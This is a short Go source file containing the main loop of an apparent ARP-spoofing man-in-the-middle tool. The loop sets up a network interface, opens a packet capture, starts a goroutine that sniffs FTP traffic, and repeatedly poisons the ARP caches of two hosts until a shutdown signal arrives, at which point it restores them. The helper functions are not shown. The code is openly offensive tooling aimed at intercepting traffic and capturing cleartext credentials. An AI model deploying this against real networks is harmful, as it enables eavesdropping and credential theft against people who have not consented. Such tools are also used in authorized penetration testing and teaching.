package main

import (
	"fmt"
	"time"
)

func exec() error {
	if err := setupInterface(); err != nil {
		return err
	}
	fmt.Printf("[+] Using interface %s (MAC %s, IP %s)\n", ifaceName, myMAC, myIP)

	if err := openPcap(); err != nil {
		return err
	}
	defer pcapHandle.Close()

	go signalHandler()
	go func() {
		if err := sniffFTP(); err != nil {
			fmt.Printf("[!] sniffer error: %v\n", err)
		}
	}()

	fmt.Printf("[*] Poisoning %s (%s) <-> %s (%s)\n", srcIP, srcMAC, dstIP, dstMAC)
	if err := poisonOnce(); err != nil {
		fmt.Printf("[!] poison error: %v\n", err)
	}

	ticker := time.NewTicker(arpInterval)
	defer ticker.Stop()
	for {
		select {
		case <-shutdownSignal:
			restoreARP()
			return nil
		case <-ticker.C:
			if err := poisonOnce(); err != nil {
				fmt.Printf("[!] poison error: %v\n", err)
			}
		}
	}
}
